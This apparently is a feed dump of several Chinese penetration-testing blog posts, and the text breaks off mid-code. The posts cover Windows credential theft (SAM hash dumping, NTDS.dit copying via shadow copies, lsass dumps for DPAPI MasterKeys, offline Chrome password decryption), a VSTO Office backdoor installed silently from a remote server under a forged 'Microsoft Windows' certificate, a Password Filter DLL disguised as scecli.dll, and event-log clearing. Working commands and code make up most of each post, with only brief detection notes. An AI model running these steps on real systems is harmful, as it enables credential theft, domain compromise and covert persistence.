    <content type="text"><![CDATA[0x00 前言 针对文章《Password Filter DLL在渗透测试中的应用》中wyzzoo的回复,提醒注意高版本系统上考虑的问题,地址如下: https://github.com/3gstudent/feedback/issues/13#issuecomment-371694931 于是我对这部分内容进行研究,整理成文 0x01 简介 本文将要介绍以下内容: 如何配置额外的LSA保护 如何获得监控结果 补充一个Password Filter DLL的利用思路 利用Additional LSA Protection的检测效果 0x02 配置额外的LSA保护 参考官方文档: https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection Windows8.1系统开始,为LSA提供了额外的保护,以防止由未受保护的进程读取内存和代码注入 保护方法:要求加载到LSA的任何插件都使用Microsoft签名进行数字签名 具体的说,数字签名指的是catalog签名，签名需要满足WHQL认证 参考资料： https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/whql-release-signature 关于catalog签名有过文章介绍:《CAT文件数字签名使用技巧》 测试系统： Win8.1 x64 配置方法:1、操作系统需要满足条件:Win8.1或者更新的系统 2、修改注册表注册表位置HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe，新建DWORD项AuditLevel，值为00000008 对应cmd命令如下： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe&quot; /v &quot;AuditLevel&quot; /t REG_DWORD /d &quot;00000008&quot; /f 3、重启系统0x03 获得监控结果 查看日志Event 3065和Event 3066 Event 3065：此事件记录代码完整性检查确定进程（通常是lsass.exe）试图加载不符合共享段的安全要求的特定驱动程序。但是，由于设置了系统策略，图像被允许加载。 Event 3066：此事件记录代码完整性检查确定进程（通常是lsass.exe）试图加载不符合Microsoft签名级别要求的特定驱动程序。但是，由于设置了系统策略，图像被允许加载。 位置：Applications and Services Logs\Microsoft\Windows\CodeIntegrity 能够记录不符合条件的dll，但并未阻止加载dll，如下图 通过命令行查询日志Event 3065和Event 3066： 获取日志分类列表： wevtutil el &gt;1.txt 找到CodeIntegrity对应的为Microsoft-Windows-CodeIntegrity/Operational 查找Event 3065和Event 3066： wevtutil qe Microsoft-Windows-CodeIntegrity/Operational /rd:true /f:text /q:&quot;*[system/eventid=3065 and 3066]&quot; 如下图 补充： 删除日志CodeIntegrity： wevtutil cl &quot;Microsoft-Windows-CodeIntegrity/Operational&quot; 0x04 补充一个Password Filter DLL的利用思路——利用Long UNC文件名欺骗实现DLL的“隐藏” 具体隐藏细节可参考文章《Catalog签名伪造——Long UNC文件名欺骗》 1、将dll命名为Long UNC文件名格式，保存在%windir%\system32\下lsass.exe进程默认加载scecli.dll，所以选择将dll伪装成scecli.dll 命令行： type Win32Project3.dll &gt; &quot;\\?\C:\windows\system32\scecli.dll &quot; 注： scecli.dll名称后面有一个空格 2、获得该dll的短文件名命令行： dir /x scecli*.dll 获得短文件名SCECLI~1.DLL，如下图 3、修改注册表键值读取键值： REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; 添加dll： REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\0SCECLI~1.DLL&quot; /f 4、重启使用Process Explorer查看lsass进程加载的dll 显示加载两个同样的scecli.dll，具体属性存在差别，如下图 5、检测Event 3066成功检测，如下图 0x05 补充 1、为Password Filter DLL添加一个伪造的微软Authenticode签名，并且修改证书验证机制使其生效，仍无法绕过Additional LSA Protection的监控，因为Password Filter DLL需要合法的catalog签名，而不是Authenticode签名 2、自己为Password Filter DLL制作一个catalog签名并将其添加到系统的安全编录数据库中，仍无法绕过Additional LSA Protection的监控 0x06 小结 本文介绍了配置Additional LSA Protection监控Password Filter DLL的方法和检测效果，如果Password Filter DLL未获得合法的catalog签名，系统能绕成功检测，但默认不会阻止加载 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——通过SAM数据库获得本地用户hash]]></title>
    <url>%2Fposts%2Fa446655f.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试中，获得了Windows系统的访问权限后，通常会使用mimikatz的sekurlsa::logonpasswords命令尝试读取进程lsass的信息来获取当前登录用户的密码信息，但想要全面获取系统中的密码信息，还要对SAM数据库中保存的信息进行提取，导出当前系统中所有本地用户的hash。 0x01 简介 本文将要介绍以下内容： 通过SAM数据库获得用户hash的多种方法 原理分析 0x02 通过SAM数据库获得用户hash的方法 1、在线读取SAM数据库读取当前系统的SAM数据库文件，获得系统所有本地用户的hash (1) mimikatzprivilege::debug token::elevate lsadump::sam 测试如下图 (2) pwdump7下载地址： http://passwords.openwall.net/b/pwdump/pwdump7.zip 管理员权限执行，如下图 (3) powershell下载地址： https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1 管理员权限执行，测试如下图 2、离线读取SAM数据库获取当前系统的SAM数据库文件，在另一系统下进行读取 导出SAM数据库文件有以下两种实现方法： (1) 保存注册表管理员权限 reg save HKLM\SYSTEM SystemBkup.hiv reg save HKLM\SAM SamBkup.hiv (2) 复制文件C:\Windows\System32\config\SYSTEM C:\Windows\System32\config\SAM 默认无法被复制，如下图 需要借助NinjaCopy，作者Joe Bialek，参考下载地址： https://github.com/3gstudent/NinjaCopy 导出SAM数据库文件后，在另一系统，可通过以下方式导出用户hash： (1) mimikatzlsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv 如下图 注： mimikatz的官方说明有问题，地址如下： https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump 导出命令： lsadump::sam SystemBkup.hiv SamBkup.hiv 会报错，如下图 可用的命令由@我爱这个世界提供 补充：以下工具在读取Win7系统的SAM数据库文件会报错 (1) Pwdump7如下图 (2) Pwdump5下载地址： http://passwords.openwall.net/b/pwdump/pwdump5.zip 读取结果不正确，如下图 (3) cain测试如下图 0x03 原理分析 1、读取HKLM\SYSTEM，获得syskey读取注册表项HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的键值JD、Skew1、GBG和Data中的内容，拼接成syskey 代码可参考： https://github.com/johannwmeyer/quarkspwdump/blob/a68aa6330f37eb8d00055c73e6a4e3cb52bcdd6d/src/crypt.cpp#L222 https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L219 完整计算代码可参考： https://raw.githubusercontent.com/3gstudent/Writeup/master/getsyskey.cpp (Steal from http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html) 2、使用syskey解密HKLM\SAM读取注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users下每个用户中F项和V项的内容，使用syskey进行一系列的解密 详细解密过程可参考如下链接： http://www.xfocus.net/articles/200306/550.html 综上，想要通过SAM数据库获得用户hash，需要获得两个文件：HKLM\SYSTEM和HKLM\SAM 最直接的导出方式是读取当前系统下的注册表HKLM\SYSTEM和HKLM\SAM，但需要获得system权限 从admin切换到system权限的方法可参考之前的文章：《渗透技巧——从Admin权限切换到System权限》 0x04 小节 本文介绍了通过SAM数据库获得所有用户hash的多种方法，关键在于读取HKLM\SYSTEM和HKLM\SAM LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用VSTO实现的office后门]]></title>
    <url>%2Fposts%2F86739fb1.html</url>
    <content type="text"><![CDATA[0x00 前言– 最近看了一篇文章《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》，介绍了利用VSTO实现Office后门的方法，我在之前的文章《Use Office to maintain persistence》和《Office Persistence on x64 operating system》曾对Office的后门进行过学习，本文将结合自己的研究心得，对该方法进行复现，分析利用思路，分享实际利用方法，最后介绍如何识别这种后门。 文章地址： https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/ 0x01 简介 本文将要介绍以下内容： VSTO的编写方法 实际利用思路 后门检测 0x02 VSTO的编写方法 1、VSTO简介全称Visual Studio Tools for Office 用来定制Office应用程序，能够同office控件交互 集成在Visual Studio安装包中 如下图 2、VSTO开发本节内容是对《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》的复现 (1) 新建工程Visual c# -&gt; Office -&gt; Word 2010外接程序 如下图 (2) 添加代码添加引用System.Windows.Forms 添加弹框代码： using System.Windows.Forms; MessageBox.Show(&quot;1&quot;); 如下图 (3) 编译设置对应.Net版本，编译，生成如下6个文件： Microsoft.Office.Tools.Common.v4.0.Utilities.dll Microsoft.Office.Tools.Common.v4.0.Utilities.xml WordAddIn2.dll WordAddIn2.dll.manifest WordAddIn2.pdb WordAddIn2.vsto (4) 安装插件执行WordAddIn2.vsto 弹框提示无法验证发行者，如下图 选择安装 查看控制面板 -&gt; 程序 -&gt; 程序和功能，能够找到新安装的插件 #### (5) 打开word.exe，自动加载插件 弹框，如下图 查看Word加载项，能够看到加载插件WordAddIn2，如下图 至此，成功实现Office后门的安装 0x03 实际利用思路 对于实际利用，首先需要满足安装过程无界面，所以要绕过弹框提示无法验证发行者，需要做如下改进： (1) 命令行安装VSTO插件使用VSTOInstaller.exe 系统安装Office后包含，默认路径%ProgramFiles%\Common Files\microsoft shared\VSTO\10.0 参数说明： /i: 安装 /u: 卸载 /s: 静默操作，如果需要信任提示，将不会安装或更新自定义项 安装参数如下： &quot;C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe&quot; /i /s c:\test\WordAddIn2 由于信任提示，无法验证发行者，所以安装失败 (2) 绕过验证发行者VSTO插件提供签名功能，如下图 手动生成一组签名证书，使用如下工具 makecert.exe cert2spc.exe pvk2pfx.exe certmgr.exe 来自于Windows SDK，可供参考下载的地址： https://github.com/3gstudent/signtools 生成命令： makecert -n &quot;CN=Microsoft Windows&quot; -r -sv Root.pvk Root.cer cert2spc Root.cer Root.spc pvk2pfx -pvk Root.pvk -pi 12345678password -spc Root.spc -pfx Root.pfx -f 执行后生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件 替换插件WordAddIn2的证书，如下图 证书注册（管理员权限）： certmgr.exe -add Root.cer -c -s -r localMachine TrustedPublisher certmgr.exe -add -c Root.cer -s -r localmachine root 注： 需要将证书同时添加到TrustedPublisher和root 再次安装VSTO插件，不会被拦截 (3) 远程安装VSTOInstaller.exe支持远程安装 可以将VSTO插件放在远程Web服务器上 安装参数如下： &quot;C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe&quot; /s /i http://192.168.62.131/1/WordAddIn1.vsto 综上，实际利用过程如下： 生成VSTO插件 为插件添加签名 证书注册 远程下载安装 0x04 后门检测 1、查看控制面板 -&gt; 程序 -&gt; 程序和功能，是否有可疑插件 注： VSTO插件并不会在注册表卸载配置的位置(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\)创建新键值 2、查看Office的COM加载项 注： 禁用宏并不会阻止VSTO插件的加载 0x05 小结 本文测试了利用VSTO实现Office后门的方法，结合实际利用思路，分析检测方法 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[域渗透——获得域控服务器的NTDS.dit文件]]></title>
    <url>%2Fposts%2F8eed51f1.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《导出当前域内所有用户hash的技术整理》曾介绍过通过Volume Shadow Copy实现对ntds.dit文件的复制， 可用来导出域内所有用户hash。本文将尝试做系统总结，总结多种不同的方法。 0x01 简介 本文将要介绍以下内容： 多种实现方法 比较优缺点 0x02 通过Volume Shadow Copy获得域控服务器NTDS.dit文件 测试系统： Server 2008 R2 x64 Server 2012 R2 x64 Volume Shadow Copy Service： 用于数据备份 支持Windows Server 2003 及以上操作系统 系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定 禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup 1、ntdsutil域环境默认安装 支持系统： Server 2003 Server 2008 Server 2012 … 常用命令：(1) 查询当前快照列表 ntdsutil snapshot &quot;List All&quot; quit quit (2) 查询已挂载的快照列表 ntdsutil snapshot &quot;List Mounted&quot; quit quit (3) 创建快照 ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit (4) 挂载快照 ntdsutil snapshot &quot;mount GUID&quot; quit quit (5) 卸载快照: ntdsutil snapshot &quot;unmount GUID&quot; quit quit (6) 删除快照 ntdsutil snapshot &quot;delete GUID&quot; quit quit 实际测试：(1) 查询当前系统的快照 ntdsutil snapshot &quot;List All&quot; quit quit ntdsutil snapshot &quot;List Mounted&quot; quit quit (2) 创建快照 ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit guid为{6e31c0ab-c517-420b-845d-c38acbf77ab9} 如下图 (3) 挂载快照 ntdsutil snapshot &quot;mount {6e31c0ab-c517-420b-845d-c38acbf77ab9}&quot; quit quit 快照挂载为C:\$SNAP_201802270645_VOLUMEC$\，如下图 (4) 复制ntds.dit copy C:\$SNAP_201802270645_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit (5) 卸载快照: ntdsutil snapshot &quot;unmount {6e31c0ab-c517-420b-845d-c38acbf77ab9}&quot; quit quit (6) 删除快照 ntdsutil snapshot &quot;delete {6e31c0ab-c517-420b-845d-c38acbf77ab9}&quot; quit quit 2、vssadmin域环境默认安装 支持系统： Server 2008 Server 2012 … 常用命令：(1) 查询当前系统的快照 vssadmin list shadows (2) 创建快照 vssadmin create shadow /for=c: (3) 删除快照 vssadmin delete shadows /for=c: /quiet 实际测试：(1) 查询当前系统的快照 vssadmin list shadows (2) 创建快照 vssadmin create shadow /for=c: 获得Shadow Copy Volume Name为\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12 如下图 (3) 复制ntds.dit copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit (4) 删除快照 vssadmin delete shadows /for=c: /quiet 3、vshadow.exe系统默认不支持,，可在Microsoft Windows Software Development Kit (SDK)中获得该工具 注： 64位系统需要使用64位的vshadow.exe 不同系统可供使用的vshadow.exe下载地址： http://edgylogic.com/blog/vshadow-exe-versions/ 常用命令：(1) 查询当前系统的快照 vshadow.exe -q (2) 创建快照 vshadow.exe -p -nw C: 参数说明： -p persistent，备份操作或是重启系统不会删除 -nw no writers，用来提高创建速度 C: 对应c盘 (3) 删除快照 vshadow -dx=ShadowCopySetId vshadow -ds=ShadowCopyId 实际测试：(1) 查询当前系统的快照 vshadow.exe -q (2) 创建快照 vshadow.exe -p -nw C: 获得SnapshotSetID为{809b77cc-cf9a-4101-b802-08e97d10e613} 获得SnapshotID为{ef99d039-9a38-4e8b-9f57-e3113d464f76} 获得Shadow copy device name为\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10 如下图 (3) 复制ntds.dit copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds.dit (4) 删除快照 vshadow -dx={809b77cc-cf9a-4101-b802-08e97d10e613} or vshadow -ds={ef99d039-9a38-4e8b-9f57-e3113d464f76} 4、vssown.vbs可供参考的下载地址： https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs 本质上是通过wmi对ShadowCopy进行操作 通过wmi查询快照信息： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list powershell实现： https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1 扩展1、日志文件调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036 执行ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit会额外产生Event ID为98的日志文件 如下图 2、访问快照中的文件查看快照列表： vssadmin list shadows 无法直接访问\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12中的文件 可通过创建符号链接访问快照中的文件： mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\ 如下图 删除符号链接： rd c:\testvsc 利用思路： 如果当前系统存在快照文件，可对系统的历史文件进行访问 3、利用vshadow执行命令参考资料： https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/ 执行命令： vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c: 执行后，后台存在进程VSSVC.exe，同时显示服务Volume Shadow Copy正在运行，需要手动关闭进程VSSVC.exe 注： 手动关闭进程VSSVC.exe会生成日志7034 利用思路： vshadow.exe包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns的默认启动列表不显示 0x03 通过NinjaCopy获得域控服务器NTDS.dit文件 下载地址： https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1 没有调用Volume Shadow Copy服务，所以不会产生日志文件7036 0x04 小结 本文整理了多种获得域控服务器NTDS.dit文件的方法，测试使用环境，比较优缺点。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——获取Windows系统下DPAPI中的MasterKey]]></title>
    <url>%2Fposts%2F67034cad.html</url>
    <content type="text"><![CDATA[0x00前言 对于Windows系统，用户的加密数据大都采用DPAPI进行存储，而想要解密这些数据解，必须要获得DPAPI对应的MasterKey。本文将会介绍在获得了Windows系统的权限后获得MasterKey的方法，同时分析Preferred文件格式，延长MasterKey的有效期 0x01 简介 本文将要介绍以下内容 基本概念 获得MasterKey的方法 解析Preferred文件 修改MasterKey失效时间 0x02 基本概念 DPAPI：全称Data Protection Application Programming Interface 作为Windows系统的一个数据保护接口被广泛使用 主要用于保护加密的数据，常见的应用如： EFS文件加密 存储无线连接密码 Windows Credential Manager Internet Explorer Outlook Skype Windows CardSpace Windows Vault Google Chrome Master Key：64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中 Master Key file：二进制文件，可使用用户登录密码对其解密，获得Master Key 分为两种： 用户Master Key file，位于%APPDATA%\Microsoft\Protect\%SID% 系统Master Key file，位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User Preferred文件：位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过期时间，默认90天有效期 0x03 获得MasterKey的方法 本节主要介绍通过mimikatz获得MasterKey的方法 1、在线获取通过读取Lsass进程信息，获取当前系统中的MasterKey，能获得多个Master Key file对应的MasterKey 管理员权限： privilege::debug sekurlsa::dpapi 如下图 2、离线读取思路一：使用procdump dump出LSASS进程内存 管理员权限： procdump.exe -accepteula -ma lsass.exe lsass.dmp 使用mimikatz加载dmp文件并获取各个Master Key file对应的MasterKey： sekurlsa::minidump lsass.dmp sekurlsa::dpapi 思路二：参考资料： https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials 1、复制注册表文件 管理员权限： reg save HKLM\SYSTEM SystemBkup.hiv reg save HKLM\SECURITY SECURITY.hiv 2、从注册表文件中获得DPAPI_SYSTEM mimikatz log &quot;lsadump::secrets /system:SystemBkup.hiv /security:SECURITY.hiv&quot; 如下图 DPAPI_SYSTEM中的user hash为c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3，能够用来解密位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User下的系统Master Key file 3、解密系统Master Key file，获得MasterKey mimikatz &quot;dpapi::masterkey /in:C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\04ece708-132d-4bf0-a647-e3329269a012 /system:c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3&quot; 解密获得MasterKey为3e9d7f32f2e57933ead318d075efc82325697d87d992b626a20abb5f0ffba6f073d282a837b6fa058ecff36039aa944e04b3dfb666ebace44aad6bff8789ca43 如下图 0x04 解析Preferred文件 位于Master Key file的同级目录，显示当前系统正在使用的MasterKey file及其过期时间 格式如下： typedef struct _tagPreferredMasterKey { GUID guidMasterKey; FILETIME ftCreated; } PREFERREDMASTERKEY, *PPREFERREDMASTERKEY; 例如C:\Users\b\AppData\Roaming\Microsoft\Protect\S-1-5-21-2884853959-2080156797-250722187-1002\Preferred 如下图 前16字节F6 B0 11 A1 D7 B4 C8 40 B5 36 67 2A 82 88 B9 58对应guid，调整格式后，对应文件为a111b0f6-b4d7-40c8-b536-672a8288b958 后8字节D0 08 9F 7D 11 EC D3 01对应过期时间 对于表示时间的FILETIME，格式如下： typedef struct _FILETIME { DWORD dwLowDateTime; DWORD dwHighDateTime; } FILETIME, *PFILETIME; 想要显示成日常使用的时间格式，需要将FILETIME类型转成SYSTEMTIME类型 在程序实现上，还需要注意使用sscanf_s函数将字符串转换为DWORD格式 可供参考的C代码如下： #include &lt;windows.h&gt; int main(void) { FILE *fp; unsigned char buf[24]; fopen_s(&amp;fp,&quot;Preferred&quot;,&quot;rb&quot;); fread(buf,1,24,fp); printf(&quot;Data: &quot;); for(int i=0;i&lt;24;i++) { printf(&quot;%02x&quot;,buf[i]); } fclose(fp); printf(&quot;\nguidMasterKey: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n&quot;,buf[3],buf[2],buf[1],buf[0],buf[5],buf[4],buf[7],buf[6],buf[8],buf[9],buf[10],buf[11],buf[12],buf[13],buf[14],buf[15]); char lowDateTime[9],highDateTime[9]; sprintf_s(lowDateTime,9,&quot;%02X%02X%02X%02X&quot;,buf[19],buf[18],buf[17],buf[16]); sprintf_s(highDateTime,9,&quot;%02X%02X%02X%02X&quot;,buf[23],buf[22],buf[21],buf[20]); printf(&quot;dwLowDateTime:%s\n&quot;,lowDateTime); printf(&quot;dwHighDateTime:%s\n&quot;,highDateTime); FILETIME ftUTC; SYSTEMTIME stUTC2; sscanf_s(lowDateTime,&quot;%x&quot;,&amp;ftUTC.dwLowDateTime); sscanf_s(highDateTime,&quot;%x&quot;,&amp;ftUTC.dwHighDateTime); FileTimeToSystemTime(&amp;ftUTC, &amp;stUTC2); printf(&quot;&quot;); printf(&quot;Expiry time: %d-%d-%d %d:%d:%d\n&quot;, stUTC2.wYear, stUTC2.wMonth, stUTC2.wDay, stUTC2.wHour, stUTC2.wMinute, stUTC2.wSecond); return 0; } 注： 也可以使用fread读取int型数据来解决字符串倒序的问题 读取Preferred文件，解析出当前系统正在使用的Master Key file的guid和过期时间 测试如下图 0x05 修改MasterKey失效时间 修改思路： 输入过期时间，将过期时间转为FILETIME格式，替换Preferred文件的FILETIME 可供参考的c代码如下： #include &lt;windows.h&gt; int main(void) { SYSTEMTIME st={0}; FILETIME ft={0}; printf(&quot;[+]Start to change expiry time...\n&quot;); st.wYear = 2019; st.wMonth = 12; st.wDay = 30; st.wHour = 12; st.wMinute = 30; st.wSecond = 30; printf(&quot;[+]New expiry time:%d-%d-%d %d:%d:%d\n&quot;, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond); SystemTimeToFileTime(&amp;st,&amp;ft); printf(&quot;dwLowDateTime:%08x\n&quot;,ft.dwLowDateTime); printf(&quot;dwHighDateTime:%08x\n&quot;,ft.dwHighDateTime); FILE *fp; fopen_s(&amp;fp,&quot;Preferred&quot;,&quot;rb+&quot;); fseek(fp,16,SEEK_SET); fwrite(&amp;ft.dwLowDateTime,sizeof(int),1,fp); fwrite(&amp;ft.dwHighDateTime,sizeof(int),1,fp); fclose(fp); printf(&quot;[+]Change success.\n&quot;); return 0; } 读取Preferred文件，将过期时间设置为2019-12-30 12:30:30 修改后重新读取Preferred文件信息，成功修改，如下图 0x06 小结 本文总结了在获得了Windows系统的权限后获得MasterKey的方法，编写程序自动分析Preferred文件格式并延长MasterKey的有效期 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码]]></title>
    <url>%2Fposts%2F57862677.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《渗透技巧——离线导出Chrome浏览器中保存的密码》曾得出结论：使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码。 而目前的Windows系统(如Windows Server 2012)，默认无法导出用户的明文口令，只能获得ntlm hash。 也就是说，即使获得了系统的访问权限，如果无法获得明文口令，通过文章《渗透技巧——离线导出Chrome浏览器中保存的密码》介绍的方法还是无法离线(但可以在线)导出Chrome浏览器保存的明文密码。 本文将要介绍一种新方法，利用Masterkey离线导出Chrome浏览器中保存的密码，不需要获得用户的明文口令，并且得出新的结论。 0x01 简介 本文将要介绍以下内容： 基础概念 解密思路 导出方法 实际测试 0x02 基础概念 DPAPI：全称Data Protection Application Programming Interface DPAPI blob：一段密文，可使用Master Key对其解密 Master Key：64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中 Master Key file：二进制文件，可使用用户登录密码对其解密，获得Master Key 0x03 DPAPI解密思路 1、定位加密的Master Key file文章《渗透技巧——离线导出Chrome浏览器中保存的密码》曾得出结论：无法定位解密Chrome数据库对应的Master Key file 该结论有误，实际上能够对其定位，方法见0x04 2、从lsass进程提取出Master Key此处换了一种思路，因此不需要用户的明文口令 注： 离线从Master Key file提取出Master Key，必须要获得用户的明文口令 3、使用Master Key解密DPAPI blob，获得明文0x04 实现方法 测试系统： Win7 x86 1、使用python读取数据库文件并提取出密文使用python脚本读取Login Data并保存到文件中，代码如下： from os import getenv import sqlite3 import binascii conn = sqlite3.connect(&quot;Login Data&quot;) cursor = conn.cursor() cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;) for result in cursor.fetchall(): print (binascii.b2a_hex(result[2])) f = open(&#39;test.txt&#39;, &#39;wb&#39;) f.write(result[2]) f.close() 脚本执行后，提取Login Data中保存的密文，保存为test.txt 2、获得该密文对应的Master Key filemimikatz命令如下： dpapi::blob /in:test.txt 获得对应guidMasterkey为{a111b0f6-b4d7-40c8-b536-672a8288b958} 如下图 即Master Key file的路径为%APPDATA%\Microsoft\Protect\%SID%\a111b0f6-b4d7-40c8-b536-672a8288b958 3、从lsass进程提取出Master Key(1) 在线方式需要管理员权限 mimikatz: privilege::debug sekurlsa::dpapi 如下图 提取出Master Key为666638cbaea3b7cf1dc55688f939e50ea1002cded954a1d17d5fe0fbc90b7dd34677ac148af1f32caf828fdf7234bafbe14b39791b3d7e587176576d39c3fa70 (2) 离线方式使用procdump dump出LSASS进程内存 procdump下载地址： https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump 管理员权限： procdump.exe -accepteula -ma lsass.exe lsass.dmp 使用mimikatz加载dmp文件： sekurlsa::minidump lsass.dmp sekurlsa::dpapi 注： mimikatz从lsass进程提取出Master Key后，会自动将Master Key加入系统缓存 4、使用masterkey解密mimikatz: dpapi::blob /in test.txt 成功获得明文，如下图 数据正确，如下图 0x05 利用分析 本文介绍的方法是利用lsass进程还原出Master Key，因此不需要获取到用户的明文密码 同时，配合procdump，不需要在测试系统上执行mimikatz，只需要获得目标系统的两个文件：lsass进程的dmp文件和Login Data文件，在本地使用mimikatz还原出Master Key，解密获得明文 并且，不需要从System权限降权到当前用户权限 综上，离线导出的完整思路如下： 1、获得用户系统Chrome保存密码的SQLite数据库文件，位于%LocalAppData%\Google\Chrome\User Data\Default\Login Data2、获得lsass进程的内存文件3、在本地使用mimikatz提取Master Key，解密Login Data获得明文0x06 最终结论 1、能够定位Master Key file方法1: mimikatz命令： dpapi::blob /in:test.txt 方法2： 通过读取文件Preferred的前16字节获得对应的Master Key file 2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码0x07 小结 本文介绍了如何利用Masterkey离线导出Chrome浏览器中保存的密码，相比于之前的方法，更加通用 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows下剪贴板的利用]]></title>
    <url>%2Fposts%2Ffaa84540.html</url>
    <content type="text"><![CDATA[0x00 前言 在Windows系统下，剪贴板是一个常见的功能，这其中有哪些可被利用的地方呢？本文将尝试整理这部分内容 0x01 简介 本文将要介绍以下内容： 写入剪贴板的方法 读取剪贴板的方法 利用思路 0x02 剪贴板简介 剪贴板是指windows操作系统提供的一个暂存数据和共享数据的模块，可理解为数据中转站 剪贴板的内容保存在内存中，所以系统重启后，保存的数据丢失 XP系统支持剪贴板查看器clipbrd.exe(Win7后移除)，可查看剪贴板内容 剪贴板查看器clipbrd.exe不需要安装，可直接在其他系统(例如Win7)下使用 复制数据后，在剪贴板查看器clipbrd.exe中实时显示复制的内容，如下图 0x03 写入剪贴板的方法 1、Ctrl+C复制数据，或者通过快捷键Ctrl+C，数据保存到剪贴板中 2、cmd下的方法将whoami输出的内容复制到剪贴板上： whoami|clip 如下图 将11.txt的内容复制到剪贴板上： clip&lt;11.txt 如下图 3、程序调用API实现c++测试代码如下： #include &lt;windows.h&gt; BOOL CopyToClipboard(char* pszData) { if(::OpenClipboard(NULL)) { ::EmptyClipboard(); HGLOBAL clipbuffer; char *buffer; clipbuffer = ::GlobalAlloc(GMEM_DDESHARE, strlen(pszData)+1); buffer = (char *)::GlobalLock(clipbuffer); strcpy_s(buffer,strlen(pszData)+1, pszData); ::GlobalUnlock(clipbuffer); ::SetClipboardData(CF_TEXT, clipbuffer); ::CloseClipboard(); return TRUE; } return FALSE; } int main(int argc, char* argv[]) { CopyToClipboard(&quot;clipcopydatatest&quot;); return 0; } 执行如下图 0x04 读取剪贴板的内容 1、Ctrl+V粘贴数据，或者通过快捷键Ctrl+V，读取剪贴板中保存的数据 2、读取工具剪贴板查看器clipbrd.exe 3、程序调用API实现c++测试代码如下： #include &lt;windows.h&gt; BOOL GetTextFromClipboard() { if(::OpenClipboard(NULL)) { HGLOBAL hMem = GetClipboardData(CF_TEXT); if(NULL != hMem) { char* lpStr = (char*)::GlobalLock(hMem); if(NULL != lpStr) { printf(&quot;%s&quot;,lpStr); ::GlobalUnlock(hMem); } } ::CloseClipboard(); return TRUE; } return FALSE; } int main(int argc, char* argv[]) { GetTextFromClipboard(); return 